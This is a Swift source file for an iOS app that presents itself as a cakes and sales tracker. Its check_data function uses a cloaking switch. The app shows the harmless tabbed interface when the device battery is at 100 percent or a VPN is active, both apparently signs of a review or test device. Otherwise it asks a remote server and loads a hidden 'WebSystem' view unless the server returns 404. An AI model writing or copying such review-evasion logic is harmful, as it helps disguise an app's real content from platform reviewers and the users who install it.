//
//  ContentView.swift
//  TH_BeNo
//
//  Created by IGOR on 24/07/2025.
//

import SwiftUI

struct ContentView: View {
    
    @State var current_tab: Tab = Tab.Cakes
    
    @AppStorage("status") var status: Bool = false
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color.white
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                CakesView()
                                    .tag(Tab.Cakes)
                                
                                SalesView()
                                    .tag(Tab.Sales)
                                
                                SettingsView()
                                    .tag(Tab.Settings)
                                
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        
                    } else {
                        
                        OB1()
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                    
//                    if status {
//                        
//                        WebSystem()
//                        
//                    } else {
//                        
//                        U1()
//                    }
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        let urlString = DataManager().serverURL

        if currentPercent == 100 || isVPNActive == true {
            self.isBlock = true
            self.isFetched = true
            return
        }

        guard let url = URL(string: urlString) else {
            self.isBlock = true
            self.isFetched = true
            return
        }

        let urlSession = URLSession.shared
        let urlRequest = URLRequest(url: url)

        urlSession.dataTask(with: urlRequest) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
                self.isBlock = true
            } else {
                self.isBlock = false
            }
            self.isFetched = true
        }.resume()
    }

}

#Preview {
    ContentView()
}
